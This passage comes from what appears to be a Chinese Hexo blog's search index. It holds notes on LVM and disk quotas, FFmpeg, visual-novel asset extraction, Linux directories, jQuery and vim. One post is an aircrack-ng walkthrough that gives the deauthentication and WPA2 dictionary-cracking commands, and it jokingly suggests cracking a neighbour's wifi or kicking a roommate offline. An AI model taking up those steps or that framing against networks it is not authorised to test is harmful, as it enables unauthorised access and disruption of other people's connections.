或 free 命令的输出来确保交换分区已被启用了。 删除交换空间：禁用交换分区：1# swapoff /dev/sdb2 从 &#x2F;etc&#x2F;fstab 中删除项目；使用fdisk或yast工具删除分区。 删除交换文件步骤同上。 创建卷组参考：Linux服务器创建卷组Linux LVM逻辑卷 物理卷：通常一个分区或者一个硬盘就可以建立一个物理卷，物理卷的最小单位是PE,一般默认是4MB。 卷组：将多个物理卷组合到一起，成为一个卷组。 虚拟卷：其实就是在卷组的基础上再次划分，最小单位是LE，与PE一样，并且一一对应。逻辑卷跟物理卷没有本质区别，只是站在不同的层次来看罢了 创建物理卷：12pvcreate /dev/sdbpvcreate /dev/sdb&#123;1,6&#125; 查看分区表1lsblk 查看物理卷1pvdisplay 创建卷组12vgcreate 卷组名 /dev/sdbvgcreate MediaVG /dev/sdb&#123;1,6&#125; 查看卷组1vgdisplay 创建逻辑卷 创建逻辑卷12lvcreate -L 40G -n 逻辑卷名 卷组名lvcreate -L 40G -n Mp3LV MediaVG 创建文件1mkdir -p /文件名 创建文件系统1mkfs.ext4 /dev/卷组名/逻辑卷名 挂载1mount /dev/卷组名/逻辑卷名 /挂载点（文件名） 重启生效配置1/dev/卷组名/逻辑卷名 /挂载点 ext4 defaults 0 0 使用lvdisplay和lvs查看lv的信息 磁盘配额设置参考：Linux下的磁盘配额设置linux磁盘管理系列一：磁盘配额管理Linux 磁盘配额 (Quota) quotacheck命令无法创建quota.user,quota.group文件 selinux的影响，关闭selinux即可 1#setenforce 0 磁盘配额 建立测试账户和用户组12345useradd xuseradd wgroupadd zgpasswd -a x -g zgpasswd -a w -g z 打开磁盘的quota功能，用vim编辑&#x2F;etc&#x2F;fstab，修改defaults为usrquota，然后重新挂载一次，再使用mount命令可以查看&#x2F;backup分区已经加上“usrquota，grpquota”123vim /etc/fstab mount -o remount /dev/sdb1mount 扫描磁盘的使用者使用情况，并产生重要的aquota.group与aquota.user。quota.group和quota.user分别是组以及用户磁盘配额需要的配置文件，如果没有这两个文件，则磁盘配额是不会生效的12quotacheck -cugm /backupls /backup 启动quota配额1quotaon /backup 编辑用户的磁盘配额（block指定的是block的数量，默认block为4k）12edquota -u x /backupquota -v x 给指定组shuguo组进行配额12edquota -g shuguoquota -gv shuguo 用非交互的方式完成用户的配额 1setquota -u[default] |-g username|groupname 15M 25M 0. 0 /backup 例如 12setquota -u w 15M 25M 0 0 /·backuprepquota -v /backup","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"磁盘分区","slug":"磁盘分区","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"}]},{"title":"FFmpeg","slug":"FFmpeg","date":"2020-09-12T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/09/13/FFmpeg/","permalink":"http://example.com/2020/09/13/FFmpeg/","excerpt":"","text":"添加字幕不损伤画质ffmpeg -i grdedFinal.mov -vf subtitles&#x3D;portSbs.srt -crf 18 -c:a copy gradedFinalwithSubs.movhttps://avp.stackovernet.xyz/cn/q/5054ffmpeg常用参数http://blog.7cuu.com/aid/381.html","categories":[],"tags":[{"name":"FFmpeg","slug":"FFmpeg","permalink":"http://example.com/tags/FFmpeg/"}]},{"title":"aircrack-ng的使用","slug":"aircrack-ng","date":"2020-08-19T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/08/20/aircrack-ng/","permalink":"http://example.com/2020/08/20/aircrack-ng/","excerpt":"","text":"aircrack-ng的使用 aircrack-ng是什么Aircrack-ng是一个与802.11标准的无线网络分析有关的安全套件。主要功能：网络侦测，数据包嗅探，WEP和WPA&#x2F;WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探802.11a，802.11b，802.11g的数据aircrack-ng 套件包含有： 使用aircrack-ng破解wifi主要就是抓包然后用字典破解，要是玩的话，设一个弱一点的密码节省时间，要想蹭邻居家的网最好准备一个强一点的字典，不然会慢到崩溃。 准备 无线网卡 注：要是想同时上网的话，准备两个无线网卡 安装aircrack-ng的linux系统 字典 步骤 开启无线网卡监听模式1$ airmon-ng start wlp3s0 扫描目标wifi1$ airodump-ng wlp3s0mon CH（信道）加密方式：WPA2 模拟WIFI信号1$ airodump-ng --ivs -w wifi-pass --bssid wifi的MAC地址 -c 1 wlp3s0mon –ivs ：指定生成文件的格式-w ：指定文件的名称–bssid ：目标AP的MAC地址-c ：指定我们模拟的WiFi的信道 攻击指定目标使用另一个终端执行以下命令（攻击的时候目标不能使用wifi，建议在室友玩游戏太吵的时候食用）1$ aireplay-ng -0 20 -a 路由器的MAC地址 -c 目标的MAC地址 wlp3s0mon -0:发送数据包的数量-a:指定目标AP的MAC地址-c:目标用户的MAC地址（正在使用wifi的设备） 得到密码文件后破解这个靠运气，不行的话增加数据包的发送数量或者等一段时间在发送，说不定就碰上目标正在使用wifi的时候呢能不能抓到相关文件看的是目标用户是否活跃，选择目标的时候优先选择数据流量大信号强的。1$ aircrack-ng wifi-pass-01.ivs -w 字典路径","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"aircrack-ng","slug":"aircrack-ng","permalink":"http://example.com/tags/aircrack-ng/"}]},{"title":"密语提取CG记录","slug":"密语提取CG记录","date":"2020-07-07T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/07/08/密语提取CG记录/","permalink":"http://example.com/2020/07/08/%E5%AF%86%E8%AF%AD%E6%8F%90%E5%8F%96CG%E8%AE%B0%E5%BD%95/","excerpt":"","text":"又是摸鱼的一天，这几天把《密语》推完了，果然现实中的妹妹绝对比不上二次元的妹妹，看着CG我的老毛病又犯了，提取出来（之前也提取过一些黄油，不过提取完之后就没看过，一直在硬盘里吃灰）。 接下来是正题，如何提取《密语》的CG进入主目录发现文件是以.int形式封包的，我记得之前玩的ISLAND也是以.int形式封包的。密语的打包格式跟ISLAND一样，ISLAND的游戏引擎为cat-system，这款引擎对应的打包格式是.int。在网上搜索得到了一套Asmodean开发的逆向提取工具exkifint，针对的引擎 cat-system。工具的使用方法很简单，里面提供了已经编译好的可执行程序，重新创建一个文件夹，将原始文件（.int）和程序放在新建的文件夹里。目录里提供了exkifintv1 - v3 三个版本，如果不知道怎么用的话，打开powershell，切换到对应目录，直接输入exkifint_v？.exe，就可以得到usage了这里我用的是exkifint_v2.exe： 1$./exkifint_v2.exe ./image.int 然后返回一堆文件，足足有1000多个，而且还不是同一格式的。正常来说应该是得到hg3格式的文件，然后在将其转换成PNG格式的。先看看这些文件的后缀名有哪些 12345678910import osfiles = os.listdir(&#x27;./&#x27;)houzhui = []for i in files: i = i.split(&#x27;.&#x27;)[-1].lower() if i not in houzhui: houzhui.append(i)print(&quot;Extensions include: &quot;, houzhui) 发现了有几个是hg3的格式，还有很多其他格式的，基本上都带3结尾，正常来说得到的文件应该都是hg3格式的，这些格式只有3对应，试着打开这些文件，发现文件头都是hg-3，也就是说，这些文件的真实后缀是hg3，只不过文件名称和后缀被某种算法更改过。在纸上找找规律，发现是凯撒位移。所以我们只需根据后缀名确定位移距离，然后反向移动就行。 12345678910111213141516171819202122232425262728293031323334import osstdext = &quot;hg3&quot;charset = &quot;abcdefghijklmnopqrstuvwxyz&quot;def calcutale_diff(origin, target): diff = 0 start = ord(origin) - ord(&#x27;a&#x27;) end = ord(target) - ord(&#x27;a&#x27;) while start != end: diff = diff + 1 start = (start + 1) % 26 return diffdef moved(origin, diff): return chr((ord(origin) - ord(&#x27;a&#x27;) + diff) % 26 + ord(&#x27;a&#x27;))def alter_filename(origin, diff): result = [] for char in origin: if char not in charset: result.append(char) continue result.append(moved(char, diff)) return &quot;&quot;.join(result)if __name__ == &quot;__main__&quot;: filelist = os.listdir(&quot;./&quot;) for filename in filelist: if filename[-1] != &#x27;3&#x27;: continue temp = filename.lower() diff = calcutale_diff(temp.split(&#x27;.&#x27;)[1][0], &quot;h&quot;) os.rename(filename, alter_filename(temp, diff)) 然后就得到了清一色的.hg3，有的贴吧上说，得到.hg3后，使用hgx2bmp.exe ?.hg3，将hg3转换为bmp。但我没有成功。什么变化也没有。文件只是在程序中过了一遍于是我使用了另外一种方法，通过GrisaiaExtract进行转换为png格式。 galgame文件提取整合 引用https://moeblog.cn/329.htmlhttps://www.yukict.com/bbs/thread-55377-1-9.htmlhttps://github.com/trigger-segfault/GrisaiaExtractor/releases","categories":[{"name":"galgame","slug":"galgame","permalink":"http://example.com/categories/galgame/"}],"tags":[{"name":"galgame文件提取","slug":"galgame文件提取","permalink":"http://example.com/tags/galgame%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96/"}]},{"title":"linux总结","slug":"linux总结","date":"2020-01-31T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2020/02/01/linux总结/","permalink":"http://example.com/2020/02/01/linux%E6%80%BB%E7%BB%93/","excerpt":"","text":"dconf GConf是在基于 GNOME2 的 Linux 操作系统中实现对应用程序的配置及管理功能的工具。我们可以把 GConf 理解为 Linux 操作系统中的注册表。然而，它克服了 Windows 注册表的一些缺点，比如 Windows 注册表遭到破坏，可能会导致操作系统崩溃，而且 GConf 的配置信息存储于纯文本的文件中，可读性很好。在 GNOME3 中，GConf 已经被 DConf&#x2F;Gsettings 替代，但还是用些应用在使用 GConf。&#x2F;usr&#x2F;share&#x2F;applications&#x2F;里的.desktop文件桌面图标的控制文件，即点击桌面的图标启动对应的程序 一、opt目录&#x2F;opt目录用来安装附加软件包，是用户级的程序目录，可以理解为D:&#x2F;Software。安装到&#x2F;opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。opt有可选的意思，这里可以用于放置第三方大型软件（或游戏），当你不需要时，直接rm -rf掉即可。在硬盘容量不够时，也可将&#x2F;opt单独挂载到其他磁盘上使用。 二、&#x2F;usr&#x2F;local目录&#x2F;usr：系统级的目录，可以理解为C:&#x2F;Windows&#x2F;。&#x2F;usr&#x2F;lib：理解为C:&#x2F;Windows&#x2F;System32。&#x2F;usr&#x2F;local：用户级的程序目录，可以理解为C:&#x2F;Progrem Files&#x2F;。用户自己编译的软件默认会安装到这个目录下。 这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和&#x2F;usr目录具有相类似的目录结构。让软件包管理器来管理&#x2F;usr目录，而把自定义的脚本(scripts)放到&#x2F;usr&#x2F;local目录下面。 其实安装软件程序并不是非要在指定的目录下完成，安装java、tomcat等也可以安装在opt目录下，但是安装程序的扩展性和管理性来说，方便使用才是最好的。总结opt目录和usr&#x2F;local目录就是&#x2F;usr&#x2F;local下一般是你安装软件的目录，这个目录就相当于在windows下的programefiles这个目录。&#x2F;opt这个目录是一些大型软件的安装目录，或者是一些服务程序的安装目录 。 查看文件大小df与dudf可以查看一级文件夹大小、使用比例、档案系统及其挂入点，但对文件却无能为力。df -h du可以查看文件及文件夹的大小。指定深入目录的层数，参数：–max-depth&#x3D;du -h –max-depth&#x3D;1du -h –max-depth&#x3D;1 xxx&#x2F; 查看linux文件目录的大小和文件夹包含的文件数统计总数大小du -sh xmldb&#x2F;du -sm * | sort -nr &#x2F;&#x2F;统计当前目录大小 并安大小 排序 超级有用du -sk * | sort -ndu -sk * | grep guojf &#x2F;&#x2F;看一个人的大小du -m | cut -d “&#x2F;“ -f 2 &#x2F;&#x2F;看第二个&#x2F; 字符前的文字查看此文件夹有多少文件 &#x2F;&#x2F;&#x2F;* 有多少文件du -ah . 查看所有文件包括隐藏文件du xmldb&#x2F;du xmldb&#x2F;&#x2F;&#x2F;* |wc -l40752解释：wc [-lmw]参数说明：-l :多少行-m:多少字符-w:多少字","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[]},{"title":"文件提取整合","slug":"文件提取整合","date":"2019-11-30T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2019/12/01/文件提取整合/","permalink":"http://example.com/2019/12/01/%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96%E6%95%B4%E5%90%88/","excerpt":"","text":".xp3文件crass可以提取：bgm.xf3：背景音乐bgimage.xf3：背景图像data.xf3：脚本文件和随机内容（背景效果，菜单图像）evimage.xf3：事件图像又称为CG的face.xf3：在文本旁边显示的面部精灵fgimage：字符精灵gstring_pX.xf3：其他脚本文件images.xf3：菜单图像voice.xf3：所有声音 ！不要忘记在Param中添加“ game &#x3D; FSN” ！bgimage：背景图像bgm：背景音乐数据：脚本，效果和各种东西fgimage：角色精灵图像：CG的补丁：一些图像，菜单和png东西patch2：脚本patch3：???patch4：脚本patch5：脚本patch6：音效patch7：声音，特殊图像（随机随机）patch8：CG的声音：音效视频：OP的 如果要提取“ Fate Stay &#x2F; Nigh t”，请在 Param中添加“ game &#x3D; FSN ”，除非您需要.tgl文件 xp3tools 方法打开powershell 进入xpstools的目录 xp3-extract.exe files.xp3 output-directory xp3Viewer 方法.rpa文件Rpa文件是Ren’Py游戏引擎的压缩存档。所以适合所有采用Ren’Py游戏引擎的游戏[点我](URL ‘https://github.com/Lattyware/unrpa’) 程序使用py编写的，用法参考github .int文件exkifint 方法参考我的关于int文件提取的博客https://callmelord.github.io/2020/07/08/密语提取CG记录/.hg3文件的名称以t或T开头的文件是字符精灵。三个字母也表示它属于哪个字符。例如：MIC &#x2F; mic &#x3D; michiru。如果三个字母首先出现，则是CG或与角色路线相关的背景图像最后一个字母之前有一些零否零：身体精灵两个零：面部精灵三个零：嘴形精灵如果在这三个字母之后有两个数字（例如XY），则意味着这些精灵与其他XY（比例，姿势，发光度）一起出现。 .arc文件ExtractData方法.pak文件工具：Dear Pianissimo|Angelic Serenade|Kogado_pak_amlist .bmp文件trans_bmp2png 工具（使用bat脚本提高效率） .nap文件npa是Nitro +使用的存档格式 nipa -x filename.npaextract_sg_en 方法（命运石之门） extract_sg_en.exe“ C：\\ Program Files \\ Steins; Gate \\ file.npa”asmodean 工具http://asmodean.reverse.net/pages/exsgnpa.html .bin 文件如果对丢失 zlib1.dll文件有任何麻烦。只需下载文件或将现有文件复制&#x2F;粘贴&#x2F;粘贴到与exfavbin相同的文件夹中 Asmodean 方法http://asmodean.reverse.net/pages/exfavbin.html 最后给大家推荐一个网址，里面是大多数游戏文件的提取方法https://forums.fuwanovel.net/topic/4887-data-extraction-thread/","categories":[{"name":"galgame","slug":"galgame","permalink":"http://example.com/categories/galgame/"}],"tags":[{"name":"galgame游戏文件提取","slug":"galgame游戏文件提取","permalink":"http://example.com/tags/galgame%E6%B8%B8%E6%88%8F%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96/"}]},{"title":"Hexo主题记录一","slug":"Hexo主题记录一","date":"2018-11-25T16:00:00.000Z","updated":"2021-08-23T05:03:40.000Z","comments":true,"path":"2018/11/26/Hexo主题记录一/","permalink":"http://example.com/2018/11/26/Hexo%E4%B8%BB%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B8%80/","excerpt":"","text":"基于hexo的主题记录 CSS@规则@media可以让你根据不同的屏幕大小而使用不同的样式，这可以使得不需要js代码就能实现响应式布局 选择器 E &gt; F 表示选择E元素的所有子F元素，与E F的区别在于，E F选择所有后代元素，&gt;只选择一代。 E + F 表示HTML中紧随E的F元素 nth-child是个伪类的用法，如p:nth-child(2)就表示在p的父元素中选择位居第二位的p jQuery遍历定义：parents()获得当前匹配元素集合中每个元素的祖先元素，使用选择器进行筛选是可选的。 1234567891011121314151617181920212223242526272829303132333435363738$(&quot;b&quot;).parents()&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;style&gt; b, span, p, html body &#123; padding: .5em; border: 1px solid; &#125; b &#123; color:blue; &#125; strong &#123; color:red; &#125; &lt;/style&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; &lt;p&gt; &lt;span&gt; &lt;b&gt;我的父元素是：&lt;/b&gt; &lt;/span&gt; &lt;/p&gt; &lt;/div&gt;&lt;script&gt;var parentEls = $(&quot;b&quot;).parents() .map(function () &#123; return this.tagName; &#125;) .get().join(&quot;, &quot;);$(&quot;b&quot;).append(&quot;&lt;strong&gt;&quot; + parentEls + &quot;&lt;/strong&gt;&quot;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;返回：我的父元素是：SPAN, P, DIV, BODY, HTML 123456789101112131415161718192021&lt;ul class=&quot;level-1&quot;&gt; &lt;li class=&quot;item-i&quot;&gt;I&lt;/li&gt; &lt;li class=&quot;item-ii&quot;&gt;II &lt;ul class=&quot;level-2&quot;&gt; &lt;li class=&quot;item-a&quot;&gt;A&lt;/li&gt; &lt;li class=&quot;item-b&quot;&gt;B &lt;ul class=&quot;level-3&quot;&gt; &lt;li class=&quot;item-1&quot;&gt;1&lt;/li&gt; &lt;li class=&quot;item-2&quot;&gt;2&lt;/li&gt; &lt;li class=&quot;item-3&quot;&gt;3&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li class=&quot;item-c&quot;&gt;C&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li class=&quot;item-iii&quot;&gt;III&lt;/li&gt;&lt;/ul&gt;$(&#x27;li.item-a&#x27;).parents().css(&#x27;background-color&#x27;, &#x27;red&#x27;);遍历li.item-a以上的所有元素，将其背景设为红色 windowscrollTo()方法定义：scrollTo() 方法可把内容滚动到指定的坐标。语法：scrollTo(xpos,ypos) indexOf()方法定义：indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。语法：stringObject.indexOf(searchvalue,fromindex)searchvalue：必需。规定需检索的字符串值。fromindex：可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length - 1。如省略该参数，则将从字符串的首字符开始检索。注释： indexOf() 方法对大小写敏感！ 如果要检索的字符串值没有出现，则该方法返回 -1。 属性操作attr()方法attr() 方法设置或返回被选元素的属性值。 1$(selector).attr(attribute) attribute 规定要获取其值的属性。 1$(selector).attr(attribute,value) //attribute：规定属性的名称。value：规定属性的值。 12$(selector).attr(attribute,function(index,oldvalue)) //attribute：规定属性的名称。//function(index,oldvalue)：规定返回属性值的函数。该函数可接收并使用选择器的index 值和当前属性值。 1$(selector).attr(&#123;attribute:value, attribute:value ...&#125;) //attribute:value：规定一个或多个属性/值对。 target属性定义：显示哪个 DOM 元素触发了事件： 123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function()&#123; $(&quot;p, button, h1, h2&quot;).click(function(event)&#123; $(&quot;div&quot;).html(&quot;点击事件由一个 &quot; + event.target.nodeName + &quot; 元素触发&quot;); &#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;这是一个标题&lt;/h1&gt;&lt;h2&gt;这是另一个标题&lt;/h2&gt;&lt;p&gt;这是一个段落&lt;/p&gt;&lt;button&gt;这是一个按钮&lt;/button&gt;&lt;p&gt;标题、段落和按钮元素定义了一个点击事件。如果您触发了事件，下面的 div 会显示出哪个元素触发了该事件。&lt;/p&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;点击按钮返回：点击事件由一个 BUTTON 元素触发","categories":[{"name":"博客主题日志","slug":"博客主题日志","permalink":"http://example.com/categories/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%97%A5%E5%BF%97/"}],"tags":[{"name":"日志","slug":"日志","permalink":"http://example.com/tags/%E6%97%A5%E5%BF%97/"}]},{"title":"vim使用总结","slug":"vim使用总结","date":"2018-07-09T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2018/07/10/vim使用总结/","permalink":"http://example.com/2018/07/10/vim%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/","excerpt":"","text":"删除以下所有输入均在命令模式下： 1.删除光标位置到本行开头d0 2.转到文件结尾G或转到第9行9G 3.删除所有内容(先用G转到文件尾) ，使用：:1,.d或者删除第9行到第200行的内容(先用200G转到第200行) ，使用:9,.d 4.删除光标所在处字符x 5.删除光标所在前字符（大写 X ）X 6.删除到下一个单词开头dw 7.删除到本单词末尾de 8.删除到本单词末尾包括标点在内dE 9.删除到前一个单词db 10.删除到前一个单词包括标点在内dB 11.删除一整行dd 12.删除光标位置到本行结尾D d$ 移动 跳到文件的第一行：:0 或者 :1gg 跳到文件最后一行：:$G 移动光标至行首home键数字0^ 移动光标至行尾end键$ 快捷键”$”前可以加上数字表示移动的行数。例如使用”1$”表示当前行的行尾，”2$”表示当前行的下一行的行尾。 替换命令语法 1:[range]s/source/target/[option] range表示要替换的范围,想要全局替换的话,可以使用一个百分号 1:%s/xxx/xxxx 另外,小数点表示当前行,美元符号表示最后一行,数字表示范围 123:1,.s 替换第一行到当前行:.,$s 替换当前行到最后一行:1,$s 替换第一行到最后一行,相当于 :%s source（源字符） target（目标字符串） 1:1,.s/123/456 表示把第一行到当前行的首次出现的123替换成456,注意是首次出现,如果要替换某一行全部源字符串需要在后面加上 &#x2F;g另外,对于一些特殊字符比如小数点,斜杠,双引号等需要转义,方式是使用反斜杠,在需要转义的字符面前加一个反斜杠 如把”123&#x2F;&#x2F;“替换为’123\\‘ 1:s/\\&quot;123\\/\\/\\&quot;/\\&#x27;123\\\\\\\\\\&#x27;/g “123&#x2F;&#x2F;“ 中“ 转义为 &quot;&#x2F; 转义为 /‘123\\‘ 中‘ 转义为 &#39;\\ 转义为 \\option选项&#x2F;g 全局替换&#x2F;c 确认&#x2F;p 替换结果逐行显示组合选项的形式是gc当前行.与接下来两行+2： 1:.,+2s/foo/bar/g 全局替换1:%s/source/target/g 局部替换1:n,ms/source/target 查找在normal模式下按下&#x2F;即可进入查找模式，输入要查找的字符串并按下回车。 Vim会跳转到第一个匹配。按下n查找下一个，按下N查找上一个。Vim查找支持正则表达式，例如&#x2F;vim$匹配行尾的”vim”。 需要查找特殊字符需要转义，例如&#x2F;vim$匹配”vim$”。注意：查找回车应当用\\n，而替换为回车应当用\\r（相当于）。 大小写敏感查找在查找模式中加入\\c表示大小写不敏感查找，\\C表示大小写敏感查找。例如： 1/foo\\c 大小写敏感配置 1234&quot; 设置默认进行大小写不敏感查找set ignorecase&quot; 如果有一个大写字母，则切换到大小写敏感查找set smartcase 排序Vim内置了针对文本进行排序的:sort命令。你可以使用:help :sort命令，查看详细的帮助信息。请注意，Vim内置的sort命令与Linux系统下的!sort命令并非完全一致。 文本行排序使用以下命令，可以针对指定行范围内的文本进行排序： 1:3,16sort 在可视化模式下选中文本，然后执行以下命令可以对选择的文本进行排序： 1:&#x27;&lt;,&#x27;&gt;sort 使用以下命令，将在排序时去除重复的行。对于重复的多行，将仅仅保留第一行，而其它的行将被删除。 1:%sort u 使用以下命令，可以针对所有文本进行倒序排序： 1:%sort! 使用以下命令，将按照数字进行排序： 1:%sort n 组合以上命令，则可以按照数字倒序排序： 1:%sort! n 文本块排序假设我们需要对以下文本进行排序。其中，每个条目是被“.KS”和“.KE”包围的文本块；而其定义的每个术语则是以“.IP”开头的多行文字。如果我们希望按术语进行排序，那么可以通过合并行将文本块整合为一个整体，然后进行排序；稍后再重新拆分行，来恢复原有的文本格式。具体步骤如下：1）将换行符替换为“@@”字符： 1:g/^\\.KS/,/^\\.KE/-1s/$/@@/ 2）以“.KS”和“.KE”作为首尾标记来合并行： 1:g/^\\.KS/,/^\\.KE/j 3）对文本排序： 1:%sort 4）将“@@ ”字符重新替换为换行符，以恢复原有格式： 1:%s/@@ /^M/g 通过以上全局替换命令和排序命令，对文档中的特定术语进行了排序，而且保持格式不变。请注意： 为了缩短实例文字的长度，我们使用“…”来表示省略的文字；在第2步使用j命令合并行时，自动新增了一个空格；所以在第3步的替换命令中，需要查找“@@”字符以及紧随其后的一个空格；第4步命令中的“^M”，是使用Ctrl-V和Ctrl-M键输入的；如果Ctrl-V键已经被占用，那么可以使用Ctrl-Q键来替代。原文链接：https://zhuanlan.zhihu.com/p/110650001","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"vim","slug":"vim","permalink":"http://example.com/tags/vim/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"},{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"},{"name":"systemed","slug":"systemed","permalink":"http://example.com/categories/systemed/"},{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"go语言","slug":"go语言","permalink":"http://example.com/categories/go%E8%AF%AD%E8%A8%80/"},{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"},{"name":"windows","slug":"windows","permalink":"http://example.com/categories/windows/"},{"name":"github仓库","slug":"github仓库","permalink":"http://example.com/categories/github%E4%BB%93%E5%BA%93/"},{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"},{"name":"linux文件系统","slug":"linux文件系统","permalink":"http://example.com/categories/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"文件传输","slug":"文件传输","permalink":"http://example.com/categories/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"},{"name":"linux解压","slug":"linux解压","permalink":"http://example.com/categories/linux%E8%A7%A3%E5%8E%8B/"},{"name":"bbr网络加速","slug":"bbr网络加速","permalink":"http://example.com/categories/bbr%E7%BD%91%E7%BB%9C%E5%8A%A0%E9%80%9F/"},{"name":"python","slug":"python","permalink":"http://example.com/categories/python/"},{"name":"ubuntu","slug":"ubuntu","permalink":"http://example.com/categories/ubuntu/"},{"name":"内网穿透","slug":"内网穿透","permalink":"http://example.com/categories/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"galgame","slug":"galgame","permalink":"http://example.com/categories/galgame/"},{"name":"Linux定时任务","slug":"Linux定时任务","permalink":"http://example.com/categories/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"name":"Xshell","slug":"Xshell","permalink":"http://example.com/categories/Xshell/"},{"name":"博客主题日志","slug":"博客主题日志","permalink":"http://example.com/categories/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E6%97%A5%E5%BF%97/"}],"tags":[{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"},{"name":"网卡命名规则","slug":"网卡命名规则","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99/"},{"name":"百分比","slug":"百分比","permalink":"http://example.com/tags/%E7%99%BE%E5%88%86%E6%AF%94/"},{"name":"系统","slug":"系统","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F/"},{"name":"ipv6","slug":"ipv6","permalink":"http://example.com/tags/ipv6/"},{"name":"随机数","slug":"随机数","permalink":"http://example.com/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"异常","slug":"异常","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8/"},{"name":"简介","slug":"简介","permalink":"http://example.com/tags/%E7%AE%80%E4%BB%8B/"},{"name":"并发","slug":"并发","permalink":"http://example.com/tags/%E5%B9%B6%E5%8F%91/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"EOF","slug":"EOF","permalink":"http://example.com/tags/EOF/"},{"name":"awk","slug":"awk","permalink":"http://example.com/tags/awk/"},{"name":"grep","slug":"grep","permalink":"http://example.com/tags/grep/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"iper3","slug":"iper3","permalink":"http://example.com/tags/iper3/"},{"name":"测速","slug":"测速","permalink":"http://example.com/tags/%E6%B5%8B%E9%80%9F/"},{"name":"端口","slug":"端口","permalink":"http://example.com/tags/%E7%AB%AF%E5%8F%A3/"},{"name":"vim","slug":"vim","permalink":"http://example.com/tags/vim/"},{"name":"字符串","slug":"字符串","permalink":"http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"iso","slug":"iso","permalink":"http://example.com/tags/iso/"},{"name":"系统封装","slug":"系统封装","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/"},{"name":"lsof","slug":"lsof","permalink":"http://example.com/tags/lsof/"},{"name":"yum","slug":"yum","permalink":"http://example.com/tags/yum/"},{"name":"软件包管理器","slug":"软件包管理器","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"},{"name":"删除文件","slug":"删除文件","permalink":"http://example.com/tags/%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/"},{"name":"vbox","slug":"